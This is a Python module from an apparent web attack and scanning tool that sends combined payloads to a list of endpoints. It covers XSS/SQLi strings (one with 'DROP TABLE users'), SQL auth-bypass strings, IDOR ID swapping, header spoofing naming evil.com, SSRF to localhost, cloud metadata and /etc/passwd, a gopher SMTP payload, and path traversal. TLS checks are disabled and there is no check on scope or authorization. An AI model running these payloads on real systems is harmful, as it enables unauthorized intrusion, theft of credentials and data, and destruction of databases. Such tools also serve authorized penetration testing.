
#!/usr/bin/env python3
"""
Combinatorial & Multi-Vector Attack Modules: Merge XSS, auth bypass, etc, for tough-to-find bugs.
"""
import os
import re
import random
import time
import concurrent.futures
import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from colorama import Fore
from .utils import print_colored, save_to_file
from tqdm import tqdm

# Disable SSL warnings
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class CombinatorialAttacker:
    """Class to manage combinatorial attacks"""
    
    def __init__(self, endpoints, output_dir, wordlist=None, max_workers=5):
        self.endpoints = endpoints
        self.output_dir = output_dir
        self.wordlist = wordlist or []
        self.max_workers = max_workers
        self.results = []
        self.attack_vectors = {
            "xss_sqli": self.xss_sqli_combo,
            "auth_idor": self.auth_idor_combo,
            "header_injection": self.header_injection_combo,
            "race_condition": self.race_condition,
            "param_pollution": self.parameter_pollution,
            "ssrf_rce": self.ssrf_rce_combo,
            "jwt_path_traversal": self.jwt_path_traversal
        }
        
        # Ensure output directory exists
        self.results_dir = os.path.join(output_dir, "combinatorial")
        if not os.path.exists(self.results_dir):
            os.makedirs(self.results_dir)
    
    def run_all_attacks(self):
        """Run all combinatorial attacks"""
        print_colored("[*] Running combinatorial attack chains...", Fore.YELLOW)
        
        for attack_name, attack_func in tqdm(self.attack_vectors.items(), desc="Attack vectors"):
            attack_results = attack_func()
            if attack_results:
                self.results.extend(attack_results)
                attack_file = os.path.join(self.results_dir, f"{attack_name}_results.txt")
                save_to_file(attack_results, attack_file)
                
        # Save all results
        all_results_file = os.path.join(self.results_dir, "all_results.txt")
        save_to_file(self.results, all_results_file)
        
        # Create JSON report with risk levels
        self.create_json_report()
        
        print_colored(f"[+] Combinatorial attacks finished. Found {len(self.results)} potential issues.", 
                     Fore.GREEN if self.results else Fore.YELLOW)
        return self.results
    
    def create_json_report(self):
        """Create a JSON report with categorized findings"""
        import json
        
        categorized = {
            "critical": [],
            "high": [],
            "medium": [],
            "low": []
        }
        
        for result in self.results:
            if "CRITICAL" in result:
                categorized["critical"].append(result)
            elif "HIGH" in result:
                categorized["high"].append(result)
            elif "MEDIUM" in result:
                categorized["medium"].append(result)
            else:
                categorized["low"].append(result)
        
        report = {
            "summary": {
                "total": len(self.results),
                "critical": len(categorized["critical"]),
                "high": len(categorized["high"]),
                "medium": len(categorized["medium"]),
                "low": len(categorized["low"])
            },
            "findings": categorized
        }
        
        report_file = os.path.join(self.results_dir, "report.json")
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2)
    
    def xss_sqli_combo(self):
        """
        XSS + SQLi combination attack
        Attempts to inject XSS payloads that also contain SQL injection
        """
        results = []
        
        # Hybrid payloads that can trigger both XSS and SQLi
        payloads = [
            "1' OR '1'='1</script><script>alert(1)</script>",
            "<img src=x onerror=alert(document.domain)>'; DROP TABLE users; --",
            "';alert(1);//",
            "1' UNION SELECT '<script>alert(\"XSS\")</script>',2,3,4,5,6,7,8,9,10 --",
            "<svg onload=alert(1)>'; SELECT sleep(5); --"
        ]
        
        for endpoint in tqdm(self.filter_endpoints_with_params(), desc="XSS+SQLi Testing"):
            for payload in payloads:
                attacked_url = self.inject_payload_to_params(endpoint, payload)
                try:
                    resp = requests.get(attacked_url, timeout=10, verify=False)
                    
                    # Check for XSS reflection
                    if payload in resp.text:
                        results.append(f"[CRITICAL] Potential XSS+SQLi at {attacked_url}")
                    
                    # Check for SQL error messages
                    sql_errors = ["SQL syntax", "mysql_fetch", "ORA-", "PostgreSQL", "SQLite3", "syntax error"]
                    if any(err in resp.text for err in sql_errors):
                        results.append(f"[HIGH] SQL error detected with XSS payload at {attacked_url}")
                except Exception as e:
                    continue
        
        return results
    
    def auth_idor_combo(self):
        """
        Authentication bypass + IDOR combination
        Attempts to find endpoints that allow parameter manipulation to access other users' data
        """
        results = []
        
        # Common authentication and user identifiers
        id_params = ["id", "user_id", "uid", "userid", "account", "member", "user", "profile"]
        auth_bypass = ["admin' --", "admin' OR '1'='1", "' OR '1'='1"]
        
        for endpoint in tqdm(self.filter_endpoints_with_params(), desc="Auth+IDOR Testing"):
            parsed = urlparse(endpoint)
            params = parse_qs(parsed.query)
            
            # Test IDOR by changing user IDs
            for param in params:
                if any(id_word in param.lower() for id_word in id_params):
                    # Try different user IDs
                    for user_id in ["1", "2", "admin", "root"]:
                        params[param] = [user_id]
                        new_query = urlencode(params, doseq=True)
                        new_url = parsed._replace(query=new_query).geturl()
                        
                        try:
                            resp = requests.get(new_url, timeout=10, verify=False)
                            if resp.status_code == 200 and len(resp.text) > 100:
                                results.append(f"[HIGH] Potential IDOR at {new_url}")
                        except:
                            continue
            
            # Test auth bypass in login forms
            if any(auth_word in endpoint.lower() for auth_word in ["login", "auth", "signin", "account"]):
                for bypass in auth_bypass:
                    attacked_url = self.inject_payload_to_params(endpoint, bypass)
                    try:
                        resp = requests.get(attacked_url, timeout=10, verify=False)
                        if any(success_word in resp.text.lower() for success_word in ["welcome", "dashboard", "profile", "logout", "account"]):
                            results.append(f"[CRITICAL] Potential auth bypass at {attacked_url}")
                    except:
                        continue
        
        return results
    
    def header_injection_combo(self):
        """
        Tests for header injection vulnerabilities combined with other attacks
        """
        results = []
        
        # Header injection payloads
        headers = {
            "X-Forwarded-For": "127.0.0.1",
            "X-Forwarded-Host": "evil.com",
            "X-Remote-IP": "127.0.0.1",
            "X-Remote-Addr": "127.0.0.1",
            "X-Host": "evil.com",
            "Referer": "https://admin.target.com/login",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36</script><script>alert(1)</script>",
            "Cookie": "admin=true; auth=1"
        }
        
        for endpoint in tqdm(self.endpoints[:30], desc="Header Injection Testing"):  # Limit to 30 endpoints
            try:
                # First test with standard request
                normal_resp = requests.get(endpoint, timeout=10, verify=False)
                
                # Then test with manipulated headers
                header_resp = requests.get(endpoint, headers=headers, timeout=10, verify=False)
                
                # Compare responses
                if header_resp.status_code != normal_resp.status_code:
                    results.append(f"[MEDIUM] Status code changed with header manipulation at {endpoint}")
                
                # Check if response length is significantly different
                if abs(len(header_resp.text) - len(normal_resp.text)) > 100:
                    results.append(f"[HIGH] Response size changed significantly with header manipulation at {endpoint}")
                
                # Look for admin/internal content
                if any(word in header_resp.text.lower() for word in ["admin", "internal", "dashboard", "config"]) and not any(word in normal_resp.text.lower() for word in ["admin", "internal", "dashboard", "config"]):
                    results.append(f"[CRITICAL] Potential header-based access control bypass at {endpoint}")
            except:
                continue
        
        return results
    
    def race_condition(self):
        """
        Test for race conditions in endpoints
        """
        results = []
        
        # Look for endpoints related to state changes
        state_keywords = ["update", "edit", "change", "modify", "create", "delete", "add", "remove", "transfer"]
        state_endpoints = [endpoint for endpoint in self.endpoints if any(keyword in endpoint.lower() for keyword in state_keywords)]
        
        if not state_endpoints:
            return []
            
        for endpoint in tqdm(state_endpoints[:10], desc="Race Condition Testing"):  # Limit to 10 endpoints
            try:
                # Send 5 parallel requests to test for race conditions
                with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
                    futures = [executor.submit(requests.get, endpoint, timeout=5, verify=False) for _ in range(5)]
                    concurrent.futures.wait(futures)
                    
                    # Check if all responses are identical
                    responses = [future.result() for future in futures if future.done()]
                    status_codes = [resp.status_code for resp in responses]
                    content_lengths = [len(resp.text) for resp in responses]
                    
                    if len(set(status_codes)) > 1:
                        results.append(f"[HIGH] Different status codes in parallel requests to {endpoint} - Possible race condition")
                    
                    if max(content_lengths) - min(content_lengths) > 50:
                        results.append(f"[MEDIUM] Response size varied in parallel requests to {endpoint} - Possible race condition")
            except:
                continue
        
        return results
    
    def parameter_pollution(self):
        """
        Test for HTTP parameter pollution
        """
        results = []
        
        for endpoint in tqdm(self.filter_endpoints_with_params(), desc="Parameter Pollution Testing"):
            parsed = urlparse(endpoint)
            params = parse_qs(parsed.query)
            
            if not params:
                continue
                
            # Duplicate parameters with different values
            for param in list(params.keys()):
                polluted_params = params.copy()
                polluted_params[param] = polluted_params[param] + ["polluted_value"]
                
                new_query = urlencode(polluted_params, doseq=True)
                polluted_url = parsed._replace(query=new_query).geturl()
                
                try:
                    normal_resp = requests.get(endpoint, timeout=10, verify=False)
                    polluted_resp = requests.get(polluted_url, timeout=10, verify=False)
                    
                    # Check for significant differences
                    if polluted_resp.status_code != normal_resp.status_code:
                        results.append(f"[MEDIUM] Parameter pollution changed status code at {polluted_url}")
                    
                    if "error" in polluted_resp.text.lower() and "error" not in normal_resp.text.lower():
                        results.append(f"[HIGH] Parameter pollution triggered error at {polluted_url}")
                    
                    # Check if both original and polluted values appear in the response
                    original_value = params[param][0]
                    if original_value in polluted_resp.text and "polluted_value" in polluted_resp.text:
                        results.append(f"[HIGH] Parameter pollution - both values reflected in {polluted_url}")
                except:
                    continue
        
        return results
    
    def ssrf_rce_combo(self):
        """
        Combine SSRF and potential RCE vectors
        """
        results = []
        
        # SSRF payloads that might trigger RCE
        payloads = [
            "http://localhost/",
            "http://127.0.0.1/",
            "http://[::1]/",
            "http://localhost:22/",
            "http://localhost:3306/",
            "file:///etc/passwd",
            "http://169.254.169.254/latest/meta-data/",  # AWS metadata
            "http://metadata.google.internal/",  # GCP metadata
            "gopher://localhost:25/%0d%0aMAIL%20FROM%3A%3Chacker%40evil.com%3E%0d%0aRCPT%20TO%3A%3Cvictim%40target.com%3E"
        ]
        
        # Find URLs with parameters that might accept URLs
        url_param_keywords = ["url", "uri", "link", "site", "path", "dest", "redirect", "return", "next", "file", "reference", "ref", "data", "location"]
        
        for endpoint in tqdm(self.filter_endpoints_with_params(), desc="SSRF+RCE Testing"):
            parsed = urlparse(endpoint)
            params = parse_qs(parsed.query)
            
            for param in params:
                if any(keyword in param.lower() for keyword in url_param_keywords):
                    for payload in payloads:
                        # Replace the parameter value with the SSRF payload
                        new_params = params.copy()
                        new_params[param] = [payload]
                        new_query = urlencode(new_params, doseq=True)
                        new_url = parsed._replace(query=new_query).geturl()
                        
                        try:
                            resp = requests.get(new_url, timeout=10, verify=False, allow_redirects=False)
                            
                            # Check for SSRF indicators
                            if any(indicator in resp.text for indicator in ["root:", "mysql", "ssh", "Internal Server Error", "Exception", "VMware", "FTP", "MetaData"]):
                                results.append(f"[CRITICAL] Potential SSRF to internal service at {new_url}")
                            
                            # Check for file read
                            if "root:" in resp.text and "bash" in resp.text:
                                results.append(f"[CRITICAL] Potential file read via SSRF at {new_url} - /etc/passwd content found")
                        except Exception as e:
                            # Timeout might indicate successful SSRF to a closed port
                            if "timeout" in str(e).lower():
                                results.append(f"[MEDIUM] Timeout in SSRF test - potential port scanning via {new_url}")
        
        return results
    
    def jwt_path_traversal(self):
        """
        Combine JWT token tampering with path traversal attempts
        """
        results = []
        
        # Path traversal patterns
        traversal_payloads = [
            "../../../etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "....//....//....//etc/passwd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "/proc/self/environ"
        ]
        
        # Look for URLs with JWT tokens or authorization
        auth_endpoints = []
        for endpoint in self.endpoints:
            if "token=" in endpoint or "jwt=" in endpoint or "bearer=" in endpoint or "auth=" in endpoint:
                auth_endpoints.append(endpoint)
        
        if not auth_endpoints:
            # Try to find JWT tokens from initial requests
            for endpoint in self.endpoints[:30]:  # Limit to 30
                try:
                    resp = requests.get(endpoint, timeout=10, verify=False)
                    for cookie in resp.cookies:
                        if any(jwt_name in cookie.name.lower() for jwt_name in ["jwt", "token", "auth", "session"]):
                            auth_endpoints.append(endpoint)
                            break
                except:
                    continue
        
        for endpoint in tqdm(auth_endpoints, desc="JWT+Path Traversal Testing"):
            for payload in traversal_payloads:
                # 1. Try adding path traversal to URL path
                try:
                    parsed = urlparse(endpoint)
                    path_parts = parsed.path.rstrip('/').split('/')
                    
                    # Try inserting traversal at different parts of the path
                    for i in range(1, len(path_parts)):
                        new_path_parts = path_parts.copy()
                        new_path_parts.insert(i, payload)
                        new_path = '/'.join(new_path_parts)
                        
                        new_url = parsed._replace(path=new_path).geturl()
                        resp = requests.get(new_url, timeout=10, verify=False)
                        
                        if "root:" in resp.text and "bash" in resp.text:
                            results.append(f"[CRITICAL] Path traversal succeeded with possible JWT auth at {new_url}")
                        elif resp.status_code != 404:
                            results.append(f"[MEDIUM] Unusual response to path traversal with JWT at {new_url}")
                except:
                    continue
        
        return results
    
    def filter_endpoints_with_params(self):
        """Filter endpoints that have query parameters"""
        return [ep for ep in self.endpoints if "?" in ep and "=" in ep]
    
    def inject_payload_to_params(self, url, payload):
        """Inject a payload into all parameters of a URL"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            # If no params, add a test parameter
            return f"{url}{'&' if '?' in url else '?'}test={payload}"
        
        # Inject payload into all existing parameters
        for param in params:
            params[param] = [payload]
        
        new_query = urlencode(params, doseq=True)
        return parsed._replace(query=new_query).geturl()

def run_combinatorial_attacks(endpoints, output_dir, wordlist=None):
    print_colored("[*] Running combinatorial/multi-vector attacks...", Fore.YELLOW)
    
    # Create attacker instance and run all attacks
    attacker = CombinatorialAttacker(endpoints, output_dir, wordlist)
    results = attacker.run_all_attacks()
    
    # Generate summary
    out = os.path.join(output_dir, "combinatorial", "results.txt")
    save_to_file(results, out)
    
    print_colored(f"[+] Combinatorial attacks finished. Results at {out}", Fore.CYAN)
    return results
